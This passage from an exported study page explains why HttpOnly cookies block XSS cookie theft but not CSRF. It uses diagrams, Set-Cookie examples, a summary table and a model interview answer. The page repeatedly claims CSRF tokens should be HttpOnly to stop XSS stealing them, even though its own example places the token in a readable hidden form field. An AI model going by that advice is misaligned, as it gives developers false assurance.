// Attack fails - cookie not sent with cross-site POST</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8009-b8bd-e6b0a1bfc28d" class=""><strong>2. CSRF Tokens (Application-Level Protection)</strong></h3></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ed-8fe8-ef6ca12841a0" class=""><strong>How CSRF Tokens Work:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8022-be8e-c41ab8f64ed5" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- Server generates unique token for each form --&gt;&lt;form action=&quot;/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;random-token-12345&quot;&gt;
  &lt;input type=&quot;text&quot; name=&quot;to&quot; value=&quot;&quot;&gt;
  &lt;input type=&quot;text&quot; name=&quot;amount&quot; value=&quot;&quot;&gt;
&lt;/form&gt;

&lt;!-- Server validates token on submission --&gt;&lt;!-- If token doesn&#x27;t match, request is rejected --&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80d6-a684-da74dba81f4c" class=""><strong>Why CSRF Tokens Should Be HttpOnly:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8097-9b9b-ca8735d5b893" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// CSRF token stored in cookie (should be HttpOnly)Set-Cookie: csrf_token=random-token-12345; HttpOnly

// Why HttpOnly? To prevent XSS from stealing the token:// If attacker injects XSS:
&lt;script&gt;
// Cannot access csrf_token cookie (HttpOnly)// Cannot steal token to forge CSRF request
&lt;/script&gt;

// But HttpOnly doesn&#x27;t prevent CSRF itself// The token validation does!</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80fb-83d4-c4447f0ce18f"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-800a-9e68-d6dab769d291" class=""><strong>Complete Picture</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-809b-827b-cbab765abdcc" class=""><strong>HttpOnly + CSRF Token = Defense in Depth</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-804d-931a-d6c04f5470bf" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Session cookie (identifies user)Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax

// CSRF token cookie (validates request)Set-Cookie: csrf_token=xyz789; HttpOnly; Secure; SameSite=Strict
</code></pre></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80ac-9271-df41f5030aa0" class=""><strong>How They Work Together:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8040-82b1-d5b6cc68bcac" class="numbered-list" start="1"><li><strong>HttpOnly on Session Cookie:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80de-ad5b-c449faff80e8" class="bulleted-list"><li style="list-style-type:disc">Prevents XSS from stealing session cookie</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80dc-817c-c2e6ac984587" class="bulleted-list"><li style="list-style-type:disc">Does NOT prevent CSRF (browser still sends cookie)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-80e5-82a9-ee0987a9b80a" class="numbered-list" start="2"><li><strong>HttpOnly on CSRF Token:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807c-82ef-ff3e543262c9" class="bulleted-list"><li style="list-style-type:disc">Prevents XSS from stealing CSRF token</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8083-9692-e4610c61d609" class="bulleted-list"><li style="list-style-type:disc">Token validation prevents CSRF (server checks token)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b4562ad-76f0-8055-96d0-e95a8f53ece9" class="numbered-list" start="3"><li><strong>SameSite on Session Cookie:</strong><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80b4-874c-ccdefff54c0d" class="bulleted-list"><li style="list-style-type:disc">Prevents browser from sending cookie with cross-site requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-803a-996d-e3e9b4f3def1" class="bulleted-list"><li style="list-style-type:disc">Provides additional CSRF protection</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8021-bde6-f9225a44bc94"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80d4-a8ec-cb7f26155054" class=""><strong>Visual Comparison</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8018-9903-e4b25fe80be2" class=""><strong>Attack Scenario 1: XSS (HttpOnly Protects)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8031-8655-dc3213adf765" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">┌─────────────┐
│   Victim    │
│   Browser   │
└──────┬──────┘
       │
       │ 1. Visits vulnerable site
       ▼
┌─────────────────────┐
│  Vulnerable Site    │
│  (XSS vulnerability)│
└──────┬──────────────┘
       │
       │ 2. Malicious script executes
       ▼
┌─────────────────────┐
│  document.cookie    │
│  (Tries to access)  │
└──────┬──────────────┘
       │
       ├─ Without HttpOnly: ✅ Cookie stolen
       │
       └─ With HttpOnly: ❌ Access denied, attack fails
</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80cb-b132-d15c256c94be" class=""><strong>Attack Scenario 2: CSRF (HttpOnly Does NOT Protect)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-80e8-9631-fb21ff56600f" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">┌─────────────┐
│   Victim    │
│   Browser   │
└──────┬──────┘
       │
       │ 1. Logged into bank.com
       │    (Has session cookie)
       │
       │ 2. Visits evil.com
       ▼
┌─────────────────────┐
│   Attacker&#x27;s Site   │
│   (evil.com)        │
└──────┬──────────────┘
       │
       │ 3. Form submits to bank.com
       ▼
┌─────────────────────┐
│  Browser sends      │
│  request to bank.com│
└──────┬──────────────┘
       │
       │ 4. Browser automatically includes cookies
       ▼
┌─────────────────────┐
│   bank.com          │
│   Receives request  │
│   WITH cookies      │
└─────────────────────┘
       │
       ├─ HttpOnly: ❌ Still sent (doesn&#x27;t help)
       │
       ├─ SameSite=Strict: ✅ Cookie NOT sent, attack fails
       │
       └─ CSRF Token: ✅ Token validated, attack fails
</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80ca-99f4-cd27db0ba74b"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-80e0-9ca9-cacfcd3b78dc" class=""><strong>Key Takeaways</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80f1-be1a-c5a087101ac0" class=""><strong>HttpOnly:</strong></h3></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ce-ae37-e671576493b8" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Protects against:</strong> XSS cookie theft</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-8043-b7f0-c7fc6b571352" class="bulleted-list"><li style="list-style-type:disc">❌ <strong>Does NOT protect against:</strong> CSRF attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80f3-8c0a-d6954efbca2d" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Prevent JavaScript from accessing cookies</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8000-aaf0-ee97c90e0999" class=""><strong>SameSite:</strong></h3></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-800d-9d51-d4e340fb413b" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Protects against:</strong> CSRF attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-802c-a269-c62a18e7fe66" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Control when cookies are sent with requests</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8078-8f7b-f83489793853" class=""><strong>CSRF Tokens:</strong></h3></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-80ea-ac06-cb4c42ef3b3a" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>Protects against:</strong> CSRF attacks</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-807a-9008-cbc85a822f19" class="bulleted-list"><li style="list-style-type:disc"><strong>Should be HttpOnly:</strong> To prevent XSS from stealing them</li></ul></div><div style="display:contents" dir="auto"><ul id="2b4562ad-76f0-806e-b9fa-f1022718f927" class="bulleted-list"><li style="list-style-type:disc"><strong>Purpose:</strong> Validate that request came from legitimate form</li></ul></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80d5-95b7-e2298a8891bb" class=""><strong>Best Practice:</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8045-8f3e-e9656317a3f1" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Session cookieSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax

// CSRF token (if using cookie-based tokens)Set-Cookie: csrf_token=xyz789; HttpOnly; Secure; SameSite=Strict

// Or use SameSite=Strict for session cookieSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8057-b07e-f2c7debb6b9b"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8078-a4b6-d26adcdbdb05" class=""><strong>Common Interview Question</strong></h2></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-806f-b452-efc28282f895" class=""><strong>Q: &quot;Does HttpOnly protect against CSRF attacks?&quot;</strong></p></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-80c4-bbfe-e7c8279feaf9" class=""><strong>A: &quot;No, HttpOnly does not protect against CSRF attacks. HttpOnly prevents JavaScript from accessing cookies, which protects against XSS cookie theft. However, CSRF attacks work by tricking the browser into automatically sending cookies with cross-site requests, and HttpOnly does not prevent the browser from doing this. To protect against CSRF, you should use the SameSite attribute on cookies or implement CSRF tokens. CSRF tokens themselves should be HttpOnly to prevent XSS from stealing them, but the HttpOnly attribute on the token doesn&#x27;t prevent CSRF - the token validation does.&quot;</strong></p></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8068-b9fc-dc370afb26cc"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-8068-acc9-fb932360c851" class=""><strong>Summary Table</strong></h2></div><div style="display:contents" dir="ltr"><table id="2b4562ad-76f0-80af-973d-dbe1c625884b" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-801a-9615-f9bcd1c734be"><th id="F_et" class="simple-table-header-color simple-table-header">Protection Mechanism</th><th id="?GN@" class="simple-table-header-color simple-table-header">Protects Against XSS</th><th id="M~[~" class="simple-table-header-color simple-table-header">Protects Against CSRF</th><th id="{FI&gt;" class="simple-table-header-color simple-table-header">How It Works</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-800a-959f-f898c4ad77d1"><td id="F_et" class=""><strong>HttpOnly</strong></td><td id="?GN@" class="">✅ Yes</td><td id="M~[~" class="">❌ No</td><td id="{FI&gt;" class="">Prevents JavaScript access to cookies</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-8091-993a-ddce60031d89"><td id="F_et" class=""><strong>SameSite=Strict</strong></td><td id="?GN@" class="">❌ No</td><td id="M~[~" class="">✅ Yes</td><td id="{FI&gt;" class="">Prevents cookie from being sent with cross-site requests</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-80ee-9fc6-f96b0064c52b"><td id="F_et" class=""><strong>SameSite=Lax</strong></td><td id="?GN@" class="">❌ No</td><td id="M~[~" class="">✅ Partial</td><td id="{FI&gt;" class="">Prevents cookie from being sent with cross-site POST requests</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-80a0-8641-f1c4f4ab7413"><td id="F_et" class=""><strong>CSRF Tokens</strong></td><td id="?GN@" class="">❌ No</td><td id="M~[~" class="">✅ Yes</td><td id="{FI&gt;" class="">Server validates token to ensure request is legitimate</td></tr></div><div style="display:contents" dir="ltr"><tr id="2b4562ad-76f0-80a5-a476-ee9a1e53c10e"><td id="F_et" class=""><strong>Secure</strong></td><td id="?GN@" class="">❌ No</td><td id="M~[~" class="">❌ No</td><td id="{FI&gt;" class="">Ensures cookie only sent over HTTPS</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-8004-8791-faf3f3a56627"/></div><div style="display:contents" dir="auto"><h2 id="2b4562ad-76f0-800b-8b84-c7d08b794e21" class=""><strong>Real-World Example</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-8081-89e1-f6f1f094050d" class=""><strong>Vulnerable Configuration (CSRF Attack Succeeds)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-8090-9048-ed7327412cdc" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Session cookie with only HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure

// Attacker&#x27;s CSRF attack:// User visits evil.com while logged into bank.com// evil.com submits form to bank.com/transfer// Browser automatically sends sessionId cookie// Bank processes request - attack succeeds!// HttpOnly did NOT prevent this because:// - Browser still sends cookie automatically// - HttpOnly only prevents JavaScript access// - CSRF doesn&#x27;t need JavaScript to access cookie</code></pre></div><div style="display:contents" dir="auto"><h3 id="2b4562ad-76f0-80e4-af98-fe6c8f7a7b23" class=""><strong>Protected Configuration (CSRF Attack Fails)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b4562ad-76f0-806f-8abc-fe0ea670cc6a" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Option 1: SameSite protectionSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// CSRF attack fails - cookie not sent with cross-site request// Option 2: CSRF tokenSet-Cookie: sessionId=abc123; HttpOnly; Secure
Set-Cookie: csrf_token=xyz789; HttpOnly; Secure

// Server validates csrf_token// If token missing or invalid, request rejected// CSRF attack fails - no valid token</code></pre></div><div style="display:contents" dir="auto"><hr id="2b4562ad-76f0-80e4-9be9-fa991db1feea"/></div><div style="display:contents" dir="auto"><p id="2b4562ad-76f0-8094-9095-f6b94cb30fb7" class="">Remember: <strong>HttpOnly protects against XSS, not CSRF. Use SameSite or CSRF tokens to protect against CSRF.</strong></p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>